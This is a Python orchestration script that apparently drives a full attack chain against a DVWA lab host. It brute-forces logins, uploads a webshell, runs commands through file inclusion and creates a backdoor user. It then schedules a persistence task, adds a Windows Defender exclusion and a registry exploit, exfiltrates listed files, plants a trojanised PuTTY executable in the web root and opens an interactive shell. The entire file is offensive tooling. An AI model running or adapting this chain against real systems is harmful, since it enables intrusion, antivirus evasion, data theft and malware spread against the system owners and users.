from stages.recon import Recon
from stages.access import Access
from stages.execution import Execution
from stages.persistence import Persistence
from config import *
from stages.exfiltration import Exfiltration


#Step 1: Reconnaissance
recon = Recon(TARGET_IP)
#recon.scan()
#print(recon.scan_pages())

#Step 2: Access
access = Access(username_wordlist=USERNAME_WORDLIST, password_wordlist=PASSWORD_WORDLIST, url=DVWA_LOGIN_URL)
(username, password) = access.brute_force_login()
if (username, password):
    print(f"Valid credentials found: {username}:{password}")
else:
    print("No valid credentials found.")

response = access.login(username, password, DVWA_LOGIN_URL)
if response is False:
    print("Login failed with valid credentials.")

access.file_upload(WEBSHELL_FILENAME, DVWA_FILE_UPLOAD_URL)

#Step 3: Execution

execution = Execution(session=access.session)
res_whoami = execution.execute_command("whoami", DVWA_FILE_INCLUSION_URL)
print(f"Result of 'whoami' command: {res_whoami}")

persistence = Persistence(session=access.session)

response_create_user = persistence.create_user(NEW_USER, NEW_USER_PASSWORD, DVWA_FILE_INCLUSION_URL)
print(response_create_user)

#step 4: Persistence
schedule_response = persistence.schedule_task(TASK_NAME, EXPLOIT, NEW_USER, DVWA_FILE_INCLUSION_URL)
print(schedule_response)


# Step 5: Exfiltration data + upload for persistence
exfiltration = Exfiltration(host=TARGET_IP, username=NEW_USER, password=NEW_USER_PASSWORD)
exfiltration.connect()

res_exlPath = exfiltration.execute_command(EXCLUDE_COMMAND)
print(f"Result of 'Add-MpPreference' command: {res_exlPath}")

res_registry = exfiltration.execute_command(EXPLOIT_REGISTRY)
print(f"Result of 'reg add' command: {res_registry}")



for path in EXILFTRATION_DATA:
    res = exfiltration.exfiltrate_data(path)
    print(res)

res_upload = exfiltration.upload_file("malware/putty_infected.exe", f"C:/xampp/htdocs/hackable/uploads/putty.exe")
print(res_upload)

# Step 6: Shell Access
exfiltration.interactive_shell()







